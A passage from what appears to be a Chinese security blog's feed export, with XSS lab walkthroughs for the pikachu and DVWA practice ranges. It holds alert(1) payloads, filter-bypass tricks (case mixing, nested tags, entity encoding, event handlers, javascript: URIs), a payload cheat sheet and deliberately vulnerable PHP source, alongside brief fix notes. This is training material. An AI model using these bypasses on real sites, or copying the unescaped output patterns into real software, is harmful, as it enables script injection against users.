echo &#39;&lt;embed src=&quot;xsf03.swf?&#39;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#39;&quot; width=100% heigth=100%&gt;&#39;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="20-level-20"><a href="#20-level-20" class="headerlink" title="20. level-20"></a>20. level-20</h4><ul>
<li>flash xss，涉及到反编译</li>
<li>源码</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level21.php?arg01=a&amp;arg02=b&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level20&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level20&lt;/h1&gt;
&lt;?php
ini_set(&quot;display_errors&quot;, 0);
echo &#39;&lt;embed src=&quot;xsf04.swf?&#39;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#39;&quot; width=100% heigth=100%&gt;&#39;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="21-靶场说明"><a href="#21-靶场说明" class="headerlink" title="21.靶场说明"></a>21.靶场说明</h4><ul>
<li>靶场的东西很多，涉及范围很广很全，也学到很多新的东西</li>
<li>ahao2333大佬的靶场链接：<a href="https://www.cnblogs.com/xiaomeng2333/p/11595786.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaomeng2333/p/11595786.html</a></li>
<li>▲ 从level-15开始，基本上都是看着别人的博客来进行写的<ul>
<li>level-15源代码无法看见对1.gif文件的引用，即使注入也不能显示</li>
<li>level-17-20对swf文件的研究，暂无一点头绪</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS靶场--pikachu</title>
    <url>/2020/03/30/XSS%E9%9D%B6%E5%9C%BA--pikachu/</url>
    <content><![CDATA[<hr>
<h4 id="1-反射型XSS-get"><a href="#1-反射型XSS-get" class="headerlink" title="1. 反射型XSS(get)"></a>1. 反射型XSS(get)</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码进行审查，发现无过滤和转义</li>
<li>插入弹窗尝试：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><ul>
<li>输入框限制了输入长度，F12审查元素修改maxlength属性</li>
</ul>
</li>
<li>⭐ 成功弹窗</li>
<li>▲ get形式的参数，可以在url地址栏中查看</li>
<li>源码分析<ul>
<li>没有任何过滤，输入弹窗即可</li>
</ul>
</li>
</ul>
<h4 id="2-反射型XSS-post"><a href="#2-反射型XSS-post" class="headerlink" title="2. 反射型XSS(post)"></a>2. 反射型XSS(post)</h4><ul>
<li>需要登陆用户进去<ul>
<li>用户：admin / 密码：123456</li>
</ul>
</li>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码进行审查，发现无过滤和转义</li>
<li>插入弹窗尝试：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>⭐ 成功弹窗</li>
<li>▲ post形式的参数，只能通过数据包的拦截来查看，是写在body里面的，以表单形式提交</li>
<li>源码分析<ul>
<li>没有任何过滤，但需要登陆</li>
</ul>
</li>
</ul>
<h4 id="3-存储型XSS"><a href="#3-存储型XSS" class="headerlink" title="3. 存储型XSS"></a>3. 存储型XSS</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码进行审查，发现无过滤和转义</li>
<li>插入弹窗尝试：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>⭐ 成功弹窗</li>
<li>▲ 存储型XSS会把数据存储在数据库，每次一访问页面，都会显示出来</li>
<li>源码分析<ul>
<li>没有任何过滤，将post拿到的数据进行拼接，连接数据库</li>
</ul>
</li>
</ul>
<h4 id="4-DOM型XSS"><a href="#4-DOM型XSS" class="headerlink" title="4. DOM型XSS"></a>4. DOM型XSS</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12审查元素进行审查，发现对<code>&lt;script&gt;&lt;/script</code>字段进行过滤，又看到是a标签</li>
</ul>
<p><img src="/images/xss/pikachu/DOM--XSS-%E8%BF%87%E6%BB%A4.png" srcset="/img/loading.gif" alt="DOM--XSS-过滤"></p>
<ul>
<li>绕过方法<ul>
<li>onclick事件：<code>q&quot; onclick=&quot;alert(1)&quot;&gt;</code></li>
</ul>
</li>
<li>⭐ 成功弹窗</li>
<li>▲ 这里踩坑了，因为是onclick事件，所以需要出现可以点击的标签</li>
<li>▲ 婷婷哈大佬提示到，可以看源代码分析js文件，确实是有这么一个好东西</li>
<li>源码分析<ul>
<li>没有过滤，但需要分析js文件才能知道怎么构造</li>
</ul>
</li>
</ul>
<p><img src="/images/xss/pikachu/DOM--XSS-%E5%88%86%E6%9E%90js%E6%96%87%E4%BB%B6.png" srcset="/img/loading.gif" alt="DOM--XSS-分析js文件"></p>
<h4 id="5-DOM型XSS-X"><a href="#5-DOM型XSS-X" class="headerlink" title="5. DOM型XSS-X"></a>5. DOM型XSS-X</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12审查元素进行审查，发现过滤情况有点不明确</li>
<li>F12查看源代码，定位javascript代码的地方，发现了url的构造方法</li>
</ul>
<p><img src="/images/xss/pikachu/DOM--XSSX-%E5%88%86%E6%9E%90js%E6%96%87%E4%BB%B6.png" srcset="/img/loading.gif" alt="DOM--XSSX-分析js文件"></p>
<ul>
<li>绕过方法<ul>
<li>闭合标签：<code>&#39;&quot; onclick=alert(1)&gt;</code></li>
</ul>
</li>
<li>⭐ 成功弹窗</li>
<li>源码分析<ul>
<li>没有过滤，但需要分析js文件才能知道怎么构造</li>
</ul>
</li>
</ul>
<h4 id="6-XSS之盲打"><a href="#6-XSS之盲打" class="headerlink" title="6. XSS之盲打"></a>6. XSS之盲打</h4><ul>
<li>content和name插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码进行审查，发现无过滤和转义</li>
<li>content和name插入弹窗尝试：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>在提示下登陆后台/xssblind/admin_login.php</li>
<li>⭐ 成功弹窗</li>
<li>▲ xss盲打，顾名思义，一般是打到登陆留言后台</li>
<li>源码分析<ul>
<li>xss盲打，没有任何过滤，打出来效果很难去验证，可以乱插截取cookie的字符串</li>
</ul>
</li>
</ul>
<p><img src="/images/xss/pikachu/%E7%9B%B2%E6%89%93--XSS-%E7%94%A8%E6%88%B7%E5%8F%8D%E9%A6%88.png" srcset="/img/loading.gif" alt="盲打--XSS-用户反馈"></p>
<h4 id="7-XSS之过滤"><a href="#7-XSS之过滤" class="headerlink" title="7. XSS之过滤"></a>7. XSS之过滤</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码进行审查，发现无过滤和转义</li>
<li>插入弹窗尝试：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>F12源代码进行审查，发现对<code>&lt;script&gt;&lt;/script</code>字段进行过滤</li>
</ul>
<p><img src="/images/xss/pikachu/%E8%BF%87%E6%BB%A4--XSS-%E8%BF%87%E6%BB%A4.png" srcset="/img/loading.gif" alt="过滤--XSS-过滤"></p>
<ul>
<li>绕过方法<ul>
<li>img标签：<code>&lt;img src=0 onerror=alert(1)&gt;</code></li>
</ul>
</li>
<li>⭐ 成功弹窗</li>
<li>▲ 过滤的函数有很多，过滤一般强度要大</li>
<li>源码分析<ul>
<li>会使用正则对<code>&lt;script</code>进行替换为空,也就是过滤掉</li>
</ul>
</li>
</ul>
<h4 id="8-XSS之htmlspecialchars"><a href="#8-XSS之htmlspecialchars" class="headerlink" title="8. XSS之htmlspecialchars"></a>8. XSS之htmlspecialchars</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码进行审查，发现出现了转义，但对单引号无转义</li>
</ul>
<p><img src="/images/xss/pikachu/htmlspecialchars--XSS-%E8%BF%87%E6%BB%A4.png" srcset="/img/loading.gif" alt="htmlspecialchars--XSS-过滤"></p>
<ul>
<li>绕过方法<ul>
<li><code>&#39;q onclick=&#39;alert(1)</code></li>
</ul>
</li>
<li>⭐ 成功弹窗</li>
<li>▲ htmlspecialchars()函数默认是不对单引号进行过滤，需要指定第二个参数的值</li>
<li>源码分析<ul>
<li>使用了htmlspecialchars进行处理，htmlspecialchars默认不对单引号处理</li>
</ul>
</li>
</ul>
<h4 id="9-XSS之href输出"><a href="#9-XSS之href输出" class="headerlink" title="9. XSS之href输出"></a>9. XSS之href输出</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码进行审查，发现出现了转义，但对单引号无转义</li>
</ul>
<p><img src="/images/xss/pikachu/href--XSS-%E8%BF%87%E6%BB%A4-1.png" srcset="/img/loading.gif" alt="href--XSS-过滤-1"></p>
<ul>
<li>构造单引号的payload也不行</li>
</ul>
<p><img src="/images/xss/pikachu/href--XSS-%E8%BF%87%E6%BB%A4-2.png" srcset="/img/loading.gif" alt="href--XSS-过滤-2"></p>
<ul>
<li>绕过方法<ul>
<li>javascript协议：<code>javascript:alert(1)</code></li>
</ul>
</li>
<li>⭐ 成功弹窗</li>
<li>▲ href和scr属性都可以接收javascript发来的东西</li>
<li>源码分析<ul>
<li>出在a标签的href属性里面，可以使用javascript协议来执行js</li>
<li>防御:只允许http，https，其次在进行htmlspecialchars处理</li>
</ul>
</li>
</ul>
<h4 id="10-XSS之js输出"><a href="#10-XSS之js输出" class="headerlink" title="10. XSS之js输出"></a>10. XSS之js输出</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码进行审查，发现无过滤和转义，是直接输入一个javascript中的</li>
</ul>
<p><img src="/images/xss/pikachu/js--XSS-%E8%BF%87%E6%BB%A4-1.png" srcset="/img/loading.gif" alt="js--XSS-过滤-1"></p>
<ul>
<li>插入弹窗尝试：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>发觉对<code>&lt;script&gt;</code>标签进行了闭合</li>
</ul>
<p><img src="/images/xss/pikachu/js--XSS-%E8%BF%87%E6%BB%A4-2.png" srcset="/img/loading.gif" alt="js--XSS-过滤-2"></p>
<ul>
<li>绕过方法<ul>
<li>构造闭合：<code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
</ul>
</li>
<li>⭐ 成功弹窗</li>
<li>源码分析<ul>
<li>输入动态的生成到了js中，形成xss</li>
<li>javascript里面是不会对tag和字符实体进行解释的,所以需要进行js转义</li>
<li>修复<ul>
<li>这里如果进行html的实体编码,虽然可以解决XSS的问题,但是实体编码后的内容,在JS里面不会进行翻译,这样会导致前端的功能无法使用。</li>
<li>所以在JS的输出点应该使用\对特殊字符进行转义</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="11-关于pikachu靶场"><a href="#11-关于pikachu靶场" class="headerlink" title="11. 关于pikachu靶场"></a>11. 关于pikachu靶场</h4><ul>
<li>靶场的分的很细，也有一定的提示，而且比较全，我觉得这方面是胜于dvwa的</li>
<li>婷婷哈大佬的靶场练习：<a href="https://www.cnblogs.com/199904-04/p/12362590.html" target="_blank" rel="noopener">https://www.cnblogs.com/199904-04/p/12362590.html</a><ul>
<li>写得比我细致很多</li>
</ul>
</li>
<li>▲ 通过这个靶场，我学到了DOM型XSS也要看源代码，看是怎么生成HTML代码的</li>
<li>▲ 因源码过多，已经放在Github上的仓库</li>
<li>靶场常用语句<ul>
<li>特殊字符：<code>&#39;&quot;&lt;&gt;666</code></li>
<li>弹窗：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>大小写：<code>&lt;sCrIpt&gt;alert(1)&lt;/ScrIpt&gt;</code></li>
<li>重复标签：<code>&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></li>
<li>重复script：<code>&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;</code></li>
<li>HTML实体编码：<code>&amp;#x3C;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3E;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x3C;&amp;#x2F;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3E;</code></li>
<li>onclick事件：<code>&lt;img src=x onclick=alert(1)&gt;</code></li>
<li>onload事件：<code>&lt;img src=x onload=alert(1)&gt;</code></li>
<li>onerror事件：<code>&lt;img src=x onerror=alert(1)&gt;</code></li>
<li>href属性：<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code></li>
<li>src属性：<code>&lt;img src=&quot;javascript:alert(1)&quot;&gt;</code></li>
<li>⭐ 闭合标签+注释\</li>
<li>▲ 更多的，在XSS讲解中，一般无外乎上面常用的语句与闭合标签的结合</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS靶场--dvwa</title>
    <url>/2020/03/30/XSS%E9%9D%B6%E5%9C%BA--dvwa/</url>
    <content><![CDATA[<hr>
<h4 id="1-Reflected–XSS-Low"><a href="#1-Reflected–XSS-Low" class="headerlink" title="1. Reflected–XSS(Low)"></a>1. Reflected–XSS(Low)</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码进行审查，发现无过滤和转义</li>
<li>插入弹窗尝试：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>⭐ 成功弹窗</li>
<li>源码分析<ul>
<li>没有任何过滤，接收到立即输出</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

header (&quot;X-XSS-Protection: 0&quot;);

// Is there any input?
if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {
    // Feedback for end user
    echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;;
}

?&gt; </code></pre><h4 id="2-Stored–XSS-Low"><a href="#2-Stored–XSS-Low" class="headerlink" title="2. Stored–XSS(Low)"></a>2. Stored–XSS(Low)</h4><ul>
<li>Name插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code>，发现有限制长度，F12修改maxlength属性</li>
<li>Message插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码进行审查，发现无过滤和转义</li>
<li>Name和Message插入弹窗尝试：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>⭐ 成功弹窗</li>
<li>源码分析<ul>
<li>连接数据库</li>
<li>messgae有stripslashes() 函数，清理从数据库中或者HTML取回的数据，基本上算不上过滤</li>
</ul>
</li>
</ul>
<pre><code>?php

if( isset( $_POST[ &#39;btnSign&#39; ] ) ) {
    // Get input
    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );
    $name    = trim( $_POST[ &#39;txtName&#39; ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));

    // Sanitize name input
    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));

    // Update database
    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;
    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );

    //mysql_close();
}

?&gt;</code></pre><h4 id="3-DOM-XSS-Low"><a href="#3-DOM-XSS-Low" class="headerlink" title="3. DOM-XSS(Low)"></a>3. DOM-XSS(Low)</h4><ul>
<li>Select English，发现是通过url提交</li>
<li>在default之后插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看页面元素进行审查，发现无过滤和转义</li>
<li>在default之后插入弹窗尝试：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>⭐ 成功弹窗</li>
<li>源码分析<ul>
<li>这个更直接，没有任何防护</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

# No protections, anything goes

?&gt; </code></pre><h4 id="4-Reflected–XSS-Medium"><a href="#4-Reflected–XSS-Medium" class="headerlink" title="4. Reflected–XSS(Medium)"></a>4. Reflected–XSS(Medium)</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码进行审查，发现无过滤和转义</li>
<li>插入弹窗尝试：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>F12查看源代码进行审查，发现对<code>&lt;script&gt;</code>标签进行过滤</li>
</ul>
<p><img src="/images/xss/dvwa/Reflected--XSS-Medium--%E8%BF%87%E6%BB%A4.png" srcset="/img/loading.gif" alt="Reflected--XSS-Medium--过滤"></p>
<ul>
<li>绕过方法<ul>
<li>重复标签：<code>&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/script&gt;</code></li>
</ul>
</li>
<li>⭐ 成功弹窗</li>
<li>源码分析<ul>
<li>可以看到用到了str_replace()函数对<code>&lt;script&gt;</code>标签的过滤，无其他过滤</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

header (&quot;X-XSS-Protection: 0&quot;);

// Is there any input?
if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {
    // Get input
    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );

    // Feedback for end user
    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;
}

?&gt; </code></pre><h4 id="5-Stored–XSS-Medium"><a href="#5-Stored–XSS-Medium" class="headerlink" title="5. Stored–XSS(Medium)"></a>5. Stored–XSS(Medium)</h4><ul>
<li>Name插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code>，发现有限制长度，F12修改maxlength属性</li>
<li>Message插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码进行审查，发现对Name无过滤和转义，对Message进行了过滤</li>
</ul>
<p><img src="/images/xss/dvwa/Stored--XSS-Medium--%E8%BF%87%E6%BB%A41.png" srcset="/img/loading.gif" alt="Stored--XSS-Medium--过滤1"></p>
<ul>
<li>Name和Message插入弹窗尝试：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>F12查看源代码进行审查，发现Name对<code>&lt;script&gt;</code>标签进行过滤，Message对<code>&lt;script&gt;&lt;/script&gt;</code>进行了过滤</li>
</ul>
<p><img src="/images/xss/dvwa/Stored--XSS-Medium--%E8%BF%87%E6%BB%A42.png" srcset="/img/loading.gif" alt="Stored--XSS-Medium--过滤2"> </p>
<ul>
<li>Name绕过方法<ul>
<li>大小写混合：<code>&lt;SCript&gt;alert(1)&lt;/script&gt;</code></li>
<li>▲ HTML字符实体编码无法绕过</li>
</ul>
</li>
<li>Message无法绕过</li>
<li>⭐ 成功弹窗</li>
<li>源码分析<ul>
<li>message使用了addslashes()函数，在每个特殊字符前加反斜杠（\）</li>
<li>message使用了strip_tags()函数，剥去字符串中的 HTML、XML以及PHP的标签</li>
<li>message使用了htmlspecialchars()函数过滤到极致，但这里的htmlspecialchars()函数是默认参数，不对单引号进行过滤</li>
<li>name用到了str_replace()函数对<code>&lt;script&gt;</code>标签的过滤，无其他过滤</li>
</ul>
</li>
</ul>
<pre><code> &lt;?php

if( isset( $_POST[ &#39;btnSign&#39; ] ) ) {
    // Get input
    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );
    $name    = trim( $_POST[ &#39;txtName&#39; ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name );
    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));

    // Update database
    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;
    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );

    //mysql_close();
}

?&gt;</code></pre><h4 id="6-DOM–XSS-Medium"><a href="#6-DOM–XSS-Medium" class="headerlink" title="6. DOM–XSS(Medium)"></a>6. DOM–XSS(Medium)</h4><ul>
<li>Select English，发现是通过url提交</li>
<li>在default之后插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看页面元素进行审查，发现无过滤和转义</li>
<li>在default之后插入弹窗尝试：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>会弹出default=English</li>
</ul>
<p><img src="/images/xss/dvwa/DOM--XSS-Medium--%E8%BF%87%E6%BB%A4-1.png" srcset="/img/loading.gif" alt="DOM--XSS-Medium--过滤-1"></p>
<ul>
<li>▲ 闭合标签：<code>&quot;&gt;&lt;/option&gt;&lt;/select&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>也不行，会对<code>&lt;script&gt;标签</code>进行编码</li>
</ul>
<p><img src="/images/xss/dvwa/DOM--XSS-Medium--%E8%BF%87%E6%BB%A4-2.png" srcset="/img/loading.gif" alt="DOM--XSS--Medium--过滤-2"></p>
<ul>
<li>绕过方法<ul>
<li>换JavaScript事件<ul>
<li><code>&quot;&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(1)&gt;</code></li>
</ul>
</li>
</ul>
</li>
<li>⭐ 成功弹窗</li>
<li>源码分析<ul>
<li>stripos()函数查找字符串在另一字符串中第一次出现的位置，本函数处于循环中，意味着每一个<code>&lt;script</code>都会被替换，且不区分大小写</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

// Is there any input?
if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {
    $default = $_GET[&#39;default&#39;];

    # Do not allow script tags
    if (stripos ($default, &quot;&lt;script&quot;) !== false) {
        header (&quot;location: ?default=English&quot;);
        exit;
    }
}

?&gt; </code></pre><h4 id="7-Reflected–XSS-High"><a href="#7-Reflected–XSS-High" class="headerlink" title="7. Reflected–XSS(High)"></a>7. Reflected–XSS(High)</h4><ul>
<li>插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码进行审查，发现无过滤和转义</li>
<li>插入弹窗尝试：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>F12查看源代码进行审查，发现对<code>&lt;script&gt;&lt;/script</code>标签进行过滤</li>
</ul>
<p><img src="/images/xss/dvwa/Reflected--XSS-High--%E8%BF%87%E6%BB%A4.png" srcset="/img/loading.gif" alt="Reflected--XSS-High--过滤"></p>
<ul>
<li>绕过方法<ul>
<li>img标签：<code>&lt;img src=x onerror=alert(1)&gt;</code></li>
</ul>
</li>
<li>⭐ 成功弹窗</li>
<li>源码分析<ul>
<li>正则匹配，因为处于循环中，只要是<code>&lt;script</code>字符都会被过滤，同stripos()函数</li>
</ul>
</li>
</ul>
<pre><code> &lt;?php

header (&quot;X-XSS-Protection: 0&quot;);

// Is there any input?
if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {
    // Get input
    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );

    // Feedback for end user
    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;
}

?&gt;</code></pre><h4 id="8-Stored–XSS-High"><a href="#8-Stored–XSS-High" class="headerlink" title="8. Stored–XSS(High)"></a>8. Stored–XSS(High)</h4><ul>
<li>Name插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code>，发现有限制长度，F12修改maxlength属性</li>
<li>Message插入特殊字段尝试<code>&#39;&quot;&lt;&gt;6666</code></li>
<li>F12查看源代码进行审查，发现对Name无过滤和转义，对Message进行了过滤</li>
</ul>
<p><img src="/images/xss/dvwa/Stored--XSS-High--%E8%BF%87%E6%BB%A41.png" srcset="/img/loading.gif" alt="Stored--XSS-High--过滤1"></p>
<ul>
<li>Name和Message插入弹窗尝试：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
<li>F12查看源代码进行审查，发现Name对<code>&lt;script&gt;&lt;/script</code>标签进行过滤，Message对<code>&lt;script&gt;&lt;/script&gt;</code>进行了过滤</li>
</ul>
<p><img src="/images/xss/dvwa/Stored--XSS-High--%E8%BF%87%E6%BB%A42.png" srcset="/img/loading.gif" alt="Stored--XSS-High--过滤2"></p>
<ul>
<li>绕过方法<ul>
<li>img标签：<code>&lt;img src=x onclick=alert(1)&gt;</code></li>
</ul>
</li>
<li>⭐ 成功弹窗</li>
<li>源码分析<ul>
<li>message使用了addslashes()函数，在每个特殊字符前加反斜杠（\）</li>
<li>message使用了strip_tags()函数，剥去字符串中的 HTML、XML以及PHP的标签</li>
<li>message使用了htmlspecialchars()函数过滤到极致，但这里的htmlspecialchars()函数是默认参数，不对单引号进行过滤</li>
<li>name正则匹配，因为处于循环中，只要是<code>&lt;script</code>字符都会被过滤，同stripos()函数</li>
</ul>
</li>
</ul>
<pre><code> &lt;?php

if( isset( $_POST[ &#39;btnSign&#39; ] ) ) {
    // Get input
    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );
    $name    = trim( $_POST[ &#39;txtName&#39; ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name );
    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));

    // Update database
    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;
    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );

    //mysql_close();
}

?&gt;</code></pre><h4 id="9-DOM–XSS-High"><a href="#9-DOM–XSS-High" class="headerlink" title="9. DOM–XSS(High)"></a>9. DOM–XSS(High)</h4><ul>
